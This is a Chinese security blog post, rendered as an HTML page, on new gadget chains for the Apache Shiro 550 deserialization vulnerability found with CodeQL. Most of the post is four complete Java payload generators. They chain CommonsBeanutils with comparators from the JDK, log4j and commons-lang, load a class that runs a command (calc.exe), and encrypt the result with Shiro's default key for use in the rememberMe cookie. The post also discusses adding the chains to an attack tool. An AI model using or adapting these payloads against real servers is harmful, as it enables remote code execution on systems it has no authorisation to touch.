@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CodeQL与Shiro550碰撞 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="CodeQL与Shiro550碰撞" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2022/CodeQL%E4%B8%8EShiro550%E7%A2%B0%E6%92%9E.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2022/CodeQL%E4%B8%8EShiro550%E7%A2%B0%E6%92%9E.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CodeQL与Shiro550碰撞" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"CodeQL与Shiro550碰撞","url":"http://0.0.0.0:4000/2022/CodeQL%E4%B8%8EShiro550%E7%A2%B0%E6%92%9E.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="codeql与shiro550碰撞">CodeQL与Shiro550碰撞</h1>
+
+<h2 id="jdk内置">JDK内置</h2>
+
+<p>上文说到，在JDK8u中查到了结果，一共又7个类可以替代<code class="language-plaintext highlighter-rouge">ComparableComparator</code>类。但可以直接调用实例化的类只用两个，<code class="language-plaintext highlighter-rouge">String#CASE_INSENSITIVE_ORDER</code>和<code class="language-plaintext highlighter-rouge">AttrCompare</code>，其他5个类权限皆是<code class="language-plaintext highlighter-rouge">private </code>。不能直接调用，只能通过反射调用，不过两个类也够用了，故本文只说这两个，其他的类有兴趣可以去看看。</p>
+
+<hr />
+
+<h3 id="attrcompare">AttrCompare</h3>
+
+<p><strong>Compares two attributes based on the C14n specification.(根据C14n规范比较两个属性)。</strong>这段话是官方对该类的描述。<code class="language-plaintext highlighter-rouge">AttrCompare</code>是在包<code class="language-plaintext highlighter-rouge">com.sun.org.apache.xml.internal.security.c14n.helper</code>下的一个类，是用<code class="language-plaintext highlighter-rouge">Attr</code>接口实现类比较方法。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="o">(</span><span class="nc">Attr</span> <span class="n">attr0</span><span class="o">,</span> <span class="nc">Attr</span> <span class="n">attr1</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">String</span> <span class="n">namespaceURI0</span> <span class="o">=</span> <span class="n">attr0</span><span class="o">.</span><span class="na">getNamespaceURI</span><span class="o">();</span>
+        <span class="nc">String</span> <span class="n">namespaceURI1</span> <span class="o">=</span> <span class="n">attr1</span><span class="o">.</span><span class="na">getNamespaceURI</span><span class="o">();</span>
+
+        <span class="kt">boolean</span> <span class="n">isNamespaceAttr0</span> <span class="o">=</span> <span class="no">XMLNS</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">namespaceURI0</span><span class="o">);</span>
+        <span class="kt">boolean</span> <span class="n">isNamespaceAttr1</span> <span class="o">=</span> <span class="no">XMLNS</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">namespaceURI1</span><span class="o">);</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">isNamespaceAttr0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">isNamespaceAttr1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="c1">// both are namespaces</span>
+                <span class="nc">String</span> <span class="n">localname0</span> <span class="o">=</span> <span class="n">attr0</span><span class="o">.</span><span class="na">getLocalName</span><span class="o">();</span>
+                <span class="nc">String</span> <span class="n">localname1</span> <span class="o">=</span> <span class="n">attr1</span><span class="o">.</span><span class="na">getLocalName</span><span class="o">();</span>
+
+                <span class="k">if</span> <span class="o">(</span><span class="s">"xmlns"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">localname0</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">localname0</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="k">if</span> <span class="o">(</span><span class="s">"xmlns"</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">localname1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">localname1</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="k">return</span> <span class="n">localname0</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">localname1</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="c1">// attr0 is a namespace, attr1 is not</span>
+            <span class="k">return</span> <span class="no">ATTR0_BEFORE_ATTR1</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">isNamespaceAttr1</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">// attr1 is a namespace, attr0 is not</span>
+            <span class="k">return</span> <span class="no">ATTR1_BEFORE_ATTR0</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="c1">// none is a namespace</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">namespaceURI0</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">namespaceURI1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="nc">String</span> <span class="n">name0</span> <span class="o">=</span> <span class="n">attr0</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+                <span class="nc">String</span> <span class="n">name1</span> <span class="o">=</span> <span class="n">attr1</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+                <span class="k">return</span> <span class="n">name0</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">name1</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="no">ATTR0_BEFORE_ATTR1</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">namespaceURI1</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="no">ATTR1_BEFORE_ATTR0</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="n">namespaceURI0</span><span class="o">.</span><span class="na">compareTo</span><span class="o">(</span><span class="n">namespaceURI1</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">a</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">a</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="k">return</span> <span class="o">(</span><span class="n">attr0</span><span class="o">.</span><span class="na">getLocalName</span><span class="o">()).</span><span class="na">compareTo</span><span class="o">(</span><span class="n">attr1</span><span class="o">.</span><span class="na">getLocalName</span><span class="o">());</span>
+    <span class="o">}</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">compare</code>方法是一个有参方法，所以在调用方法时并不能直接传入两个String类型或者Object类型。</p>
+
+<p><img src="https://img-blog.csdnimg.cn/f7e925b667bd4b979c760313a2e8b6e8.png" alt="11" /></p>
+
+<p>然而Attr是一个接口，不能直接实例化，只能找实现类。这里我使用的是<code class="language-plaintext highlighter-rouge">com\sun\org\apache\xerces\internal\dom\AttrNSImpl.java</code>类。</p>
+
+<p><img src="https://img.sumsec.me//35u3035ec35u3035ec.png" alt="image-20220221183035494" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        AttrCompare attrCompare = new AttrCompare();
+        AttrNSImpl attrNS = new AttrNSImpl();
+        attrNS.setValues(new CoreDocumentImpl(),"1","1","1");
+        attrCompare.compare(attrNS,attrNS);
+</code></pre></div></div>
+
+<p>最终利用代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package summersec.shirodemo.Payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xerces.internal.dom.AttrNSImpl;
+import com.sun.org.apache.xerces.internal.dom.CoreDocumentImpl;
+import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+
+
+public class CommonsBeanutilsAttrCompare {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+
+        AttrNSImpl attrNS1 = new AttrNSImpl(new CoreDocumentImpl(),"1","1","1");
+
+        final BeanComparator comparator = new BeanComparator(null, new AttrCompare());
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(attrNS1);
+        queue.add(attrNS1);
+
+
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+
+        byte[] payloads = new CommonsBeanutilsAttrCompare().getPayload(clazz.toBytecode());
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    }
+
+}
+
+</code></pre></div></div>
+
+<p>最终实际结果</p>
+
+<p><img src="https://img-blog.csdnimg.cn/0a6fb4c59be54d3d95fc711a8354e6f1.gif" alt="" /></p>
+
+<hr />
+
+<h3 id="stringcase_insensitive_order">String#CASE_INSENSITIVE_ORDER</h3>
+
+<p>该类在p牛文章详细介绍了，这里直接贴代码吧。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package summersec.shirodemo.Payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+/**
+ * @ClassName: CommonsBeanutils1Shiro
+ * @Description: TODO
+ * @Author: Summer
+ * @Date: 2021/5/19 16:23
+ * @Version: v1.0.0
+ * @Description: 参考https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html
+ **/
+
+
+public class CommonsBeanutilsString {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add("1");
+        queue.add("1");
+
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evil.class.getName());
+//        byte[] bytes = Evil.class.getName().getBytes();
+//        byte[] payloads = new CommonsBeanutils1Shiro().getPayload(bytes);
+        byte[] payloads = new CommonsBeanutilsString().getPayload(clazz.toBytecode());
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    }
+
+}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="第三方依赖">第三方依赖</h2>
+
+<p>在挖掘完前面两个类的时候，我就在想其他第三方组件里面会不会存在呢？于是乎就有了下面的结果，测试了43个开源项目，其中15个有。这里只谈论了两个组件apache/log4j、apache/Commons-lang</p>
+
+<p><img src="https://img.sumsec.me//9u329ec9u329ec.png" alt="image-20220221183209062" /></p>
+
+<hr />
+
+<h3 id="propertysourcecomparator">PropertySource#Comparator</h3>
+
+<p><code class="language-plaintext highlighter-rouge">PropertySource#Comparator</code>是在组件<code class="language-plaintext highlighter-rouge">log4j-api</code>下的一个类，log4j是Apache基金会下的一个Java日志组件，宽泛被应用在各大应用上，在<code class="language-plaintext highlighter-rouge">spring-boot</code>也能看到其身影。</p>
+
+<p><img src="https://img.sumsec.me//0u310ec0u310ec.png" alt="image-20220221183100323" /></p>
+
+<p><img src="https://img.sumsec.me//41u3141ec41u3141ec.png" alt="image-20220221183140909" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">PropertySource#Comparator</code>的代码只有八行，其中比较方法也是有参方法，参数类型是<code class="language-plaintext highlighter-rouge">PropertySource</code>。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Comparator implements java.util.Comparator&lt;PropertySource&gt;, Serializable {
+    private static final long serialVersionUID = 1L;
+
+    @Override
+    public int compare(final PropertySource o1, final PropertySource o2) {
+        return Integer.compare(Objects.requireNonNull(o1).getPriority(), Objects.requireNonNull(o2).getPriority());
+    }
+}
+</code></pre></div></div>
+
+<p>构造成gadget链的最终代码如下，在第38行开始是实现接口<code class="language-plaintext highlighter-rouge">PropertySource</code>的，不过也可以只写一个实现类就行。</p>
+
+<p>ps：这里就不在演示效果。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package summersec.shirodemo.Payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.logging.log4j.util.PropertySource;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+
+
+
+public class CommonsBeanutilsPropertySource&lt;pubilc&gt; {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        PropertySource propertySource1 = new PropertySource() {
+
+            @Override
+            public int getPriority() {
+                return 0;
+            }
+
+        };
+        PropertySource propertySource2 = new PropertySource() {
+
+            @Override
+            public int getPriority() {
+                return 0;
+            }
+
+        };
+
+        final BeanComparator comparator = new BeanComparator(null, new PropertySource.Comparator());
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+
+        queue.add(propertySource1);
+        queue.add(propertySource2);
+
+        setFieldValue(comparator, "property", "outputProperties");
+//        setFieldValue(comparator, "property", "output");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    public static class Evils extends AbstractTranslet {
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+
+        public Evils() throws Exception {
+            System.out.println("Hello TemplatesImpl");
+            Runtime.getRuntime().exec("calc.exe");
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evils.class.getName());
+        byte[] payloads = new CommonsBeanutilsPropertySource().getPayload(clazz.toBytecode());
+        ByteArrayInputStream bais = new ByteArrayInputStream(payloads);
+//        System.out.println(bais.read());
+        ObjectInputStream ois = new ObjectInputStream(bais);
+        ois.readObject();
+
+
+//        AesCipherService aes = new AesCipherService();
+//        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+//
+//        ByteSource ciphertext = aes.encrypt(payloads, key);
+//        System.out.printf(ciphertext.toString());
+    }
+
+}
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="objecttostringcomparator">ObjectToStringComparator</h3>
+
+<p><code class="language-plaintext highlighter-rouge">ObjectToStringComparator</code>是apache属于下的<code class="language-plaintext highlighter-rouge">Commons-lang</code>组件，也是一个比较典型的组件。</p>
+
+<p><img src="https://img.sumsec.me//27u3227ec27u3227ec.png" alt="image-20220221183227584" /></p>
+
+<p>该类的Compare方法参数是Object类型，比较简单。</p>
+
+<p>直接贴出代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package summersec.shirodemo.Payload;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.beanutils.BeanComparator;
+import org.apache.commons.lang3.compare.ObjectToStringComparator;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
+
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+
+
+
+public class CommonsBeanutilsObjectToStringComparator&lt;pubilc&gt; {
+
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public byte[] getPayload(byte[] clazzBytes) throws Exception {
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{clazzBytes});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        ObjectToStringComparator stringComparator = new ObjectToStringComparator();
+
+
+        final BeanComparator comparator = new BeanComparator(null, stringComparator);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        // stub data for replacement later
+        queue.add(stringComparator);
+        queue.add(stringComparator);
+
+
+
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
+
+        // ==================
+        // 生成序列化字符串
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+
+        return barr.toByteArray();
+    }
+
+    public static class Evils extends AbstractTranslet {
+        @Override
+        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
+
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
+
+        public Evils() throws Exception {
+            System.out.println("Hello TemplatesImpl");
+            Runtime.getRuntime().exec("calc.exe");
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Evils.class.getName());
+        byte[] payloads = new CommonsBeanutilsObjectToStringComparator().getPayload(clazz.toBytecode());
+
+
+        AesCipherService aes = new AesCipherService();
+        byte[] key = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
+
+        ByteSource ciphertext = aes.encrypt(payloads, key);
+        System.out.printf(ciphertext.toString());
+    }
+
+}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="集成化自动化">集成化–自动化</h2>
+
+<p>挖掘之后在想如何集成到工具里面时，使用<a href="https://github.com/j1anFen/shiro_attack">shiro_attack</a>发现，该工具里面是集成p牛的链。但本地测试的时候没有成功，看环境报错问题还是**serialVersionUID **的问题。可惜2.0版本的shiro_attack并不开源，拿着1.5版本的源码将其去掉了原依赖的CommonsBeanutils组件，并且将shiro的版本改成了1.2.4。</p>
+
+<p>玩到后面，我想了一个问题。如果开发人员，没有以这种方式去掉依赖或者其他方式去掉该依赖，亦或者依赖了更高的版本CommonsBeanutils依赖，那么shiro550漏洞在有key的情况下，是<strong>几乎</strong>不可能拿不下的！</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;exclusions&gt;
+    &lt;exclusion&gt;
+    &lt;artifactId&gt;org.apache.commons&lt;/artifactId&gt;
+    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
+    &lt;/exclusion&gt;
+    &lt;/exclusions&gt;
+</code></pre></div></div>
+
+<p>那么就是以下的情况，只需要在挖掘更多的gadget和解决高版本CommonsBeanutils的serialVersionUID不同问题。</p>
+
+<p><img src="https://img.sumsec.me//50u3250ec50u3250ec.png" alt="image-20220221183250833" /></p>
+
+<p>目前CommonsBeanutils最高版本是1.9.4（截至本文创作时间）</p>
+
+<p>CommonsBeanutils的1.9.4的升级描述是，也就是说默认情况下还是存在反序列化漏洞的，实测也存在着。</p>
+
+<blockquote>
+  <p>A special BeanIntrospector class was added in version 1.9.2. This can be used to stop attackers from using the class property of Java objects to get access to the classloader. However this protection was not enabled by default. PropertyUtilsBean (and consequently BeanUtilsBean) now disallows class level property access by default, thus protecting against CVE-2014-0114.</p>
+</blockquote>
+
+<blockquote>
+  <p>在1.9.2版本中加入了一个特殊的BeanIntrospector类。这可以用来阻止攻击者使用Java对象的class属性来获得对classloader的访问。然而，这种保护在默认情况下是不启用的。PropertyUtilsBean（以及随之而来的BeanUtilsBean）现在默认不允许类级属性访问，从而防止CVE-2014-0114。</p>
+</blockquote>
+
+<p><img src="https://img-blog.csdnimg.cn/3752208c97184e86b07a244b55f1c660.png" alt="在这里插入图片描述" /></p>
+
+<hr />
+
+<h2 id="总结">总结</h2>
+
+<p>理论上JDK内置的两个gadget是只要存在CommonsBeanutils组件（无论版本）是一定可以拿下的shiro550的，但作为一种思路我还是去研究了其他的组件。本文还是遗漏一个问题，遇到不同版本的CommonsBeanutils如何解决serialVersionUID 不同的问题？我能目前能想到方法是，首先判断CommonsBeanutils组件的版本，这个问题还是做不到。只能盲猜，用盲打的方式一个个版本尝试一次，但此方法还是比较耗时耗力。</p>
+
+<ol>
+  <li>
+    <p>CommonsBeansutils 在shiro-core1.2.4是1.8.3版本，高版本的shiro里面的版本不同。</p>
+  </li>
+  <li>
+    <ul>
+      <li>String.CASE_INSENSITIVE_ORDER –&gt; JDK</li>
+      <li>AttrCompare –&gt; JDK</li>
+      <li>ObjectToStringComparator  –&gt; apache/commons-lang</li>
+      <li>PropertySource.Comparator()  –&gt; apache/log4j</li>
+    </ul>
+
+    <p>……..</p>
+  </li>
+</ol>
+
+<p>其实在看p牛的文章的时间花了很久很久，基本上有一段时间文章链接在浏览器一直是存在的。其中还有一段时间我又去研究回显了，在机缘巧合的一天，妹子没回我消息。我重新打开电脑，研究起来然后灵光一闪……</p>
+
+<p>如有错误还请谅解，本文只是个人见解。</p>
+
+<hr />
+
+<h2 id="参考">参考</h2>
+
+<p>https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</p>
+
+
+      </section>
+    </div>
+  </body>
+</html>
